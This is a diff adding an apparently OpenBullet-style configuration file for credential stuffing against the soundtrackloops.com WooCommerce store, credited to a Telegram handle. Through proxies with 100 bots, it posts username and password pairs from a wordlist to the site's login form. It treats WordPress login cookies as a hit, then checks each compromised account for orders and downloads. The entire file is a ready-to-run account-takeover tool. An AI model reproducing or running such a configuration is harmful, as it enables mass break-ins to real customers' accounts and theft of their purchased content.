@@ -1,0 +1,113 @@
+[SETTINGS]
+{
+  "Name": "soundtrackloops",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-24T09:16:27.2982009+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://soundtrackloops.com/my-account/" 
+  CONTENT "username=<USER>&password=<PASS>&rememberme=forever&woocommerce-login-nonce=4089403e53&_wp_http_referer=%2Fmy-account%2F&login=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 145" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://soundtrackloops.com" 
+  HEADER "referer: https://soundtrackloops.com/my-account/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS{*}>" Contains "wordpress_sec_" 
+    KEY "<HEADERS{*}>" Contains "wordpress_logged_in" 
+    KEY "\">Logout</a>" 
+  KEYCHAIN Failure OR 
+    KEY "Unknown email address" 
+    KEY "Check again or try your username" 
+    KEY "is incorrect" 
+    KEY "<strong>Error</strong>: The password you entered for the email address" 
+
+#Name PARSE "<SOURCE>" LR "Hello <strong>" "</strong" CreateEmpty=FALSE -> CAP "Name" 
+
+REQUEST GET "https://soundtrackloops.com/my-account/orders/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "No order has been made yet"
+SET CAP "Has orders" "False❌"
+ELSE
+SET CAP "Has orders" "True ✔️"
+ENDIF
+
+REQUEST GET "https://soundtrackloops.com/my-account/downloads/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "No downloads available yet"
+SET CAP "Has downloads" "False❌"
+ELSE
+SET CAP "Has downloads" "True ✔️"
+ENDIF
+
+#BY FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked by" 
+
